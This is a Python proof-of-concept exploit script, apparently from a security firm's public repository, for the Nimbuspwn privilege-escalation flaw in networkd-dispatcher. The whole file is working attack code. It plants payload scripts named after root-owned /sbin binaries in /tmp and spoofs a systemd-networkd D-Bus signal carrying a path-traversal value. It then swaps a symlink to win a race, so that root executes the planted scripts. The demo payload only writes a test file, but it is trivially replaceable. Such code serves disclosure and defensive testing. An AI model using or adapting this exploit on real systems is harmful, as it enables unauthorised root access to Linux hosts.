# Copyright (C) 2022 Will Roberts, Immersive Labs
# https://github.com/Immersive-Labs-Sec/nimbuspwn
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import dbus
import dbus.service
import dbus.mainloop.glib

import os

PAYLOAD = """#!/bin/sh
echo "test" > /tmp/test
"""

class Exploit(dbus.service.Object):
    def __init__(self, conn):
        dbus.service.Object.__init__(self, conn, "/org/freedesktop/network1/link/_32")
        self.PropertiesChanged(
            "org.freedesktop.network1.Link", 
            {
                "OperationalState": "../../../tmp/nimbuspwn/poc", 
                "AdministrativeState": "a"
            }, 
            "a")

    @dbus.service.signal(dbus_interface='org.freedesktop.network1.PropertiesChanged')
    def PropertiesChanged(self, test1, test2, test3):
        print("test", test1, test2, test3)


def trigger_signal():
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)

    system_bus = dbus.SystemBus()
    name = dbus.service.BusName('org.freedesktop.network1', system_bus)
    o = Exploit(system_bus)


def prepare_directory():
    os.mkdir("/tmp/nimbuspwn")
    
    if not os.path.exists("/tmp/nimbuspwn"):
        print("Error making directory")
        exit(-1)
    
    os.symlink("/sbin", "/tmp/nimbuspwn/poc.d", True)

    if not os.path.exists("/tmp/nimbuspwn/poc.d"):
        print("Error symlinking /sbin")
        exit(-1)


def symlink_executables():
    path = ""
    files = []
    executables = []
    
    for p, _, filenames in os.walk("/sbin"):
        path = p
        for filename in filenames:
            files.append(filename)
    
    for f in files:
        fullpath = f"{path}/{f}"
        if not os.access(fullpath, os.X_OK):
            continue
        
        if not os.stat(fullpath).st_uid == 0:
            continue

        executables.append(f)

    for exe in executables:
        fullpath = f"/tmp/nimbuspwn/{exe}"
        with open(fullpath, "w+") as f:
            f.write(PAYLOAD)
        os.chmod(fullpath, 0o777)


def change_symlink():
    os.remove("/tmp/nimbuspwn/poc.d")
    os.symlink("/tmp/nimbuspwn", "/tmp/nimbuspwn/poc.d", True)


def clean_up():
    os.remove("/tmp/nimbuspwn")


if __name__ == '__main__':
    prepare_directory()
    symlink_executables()
    trigger_signal()
    change_symlink()
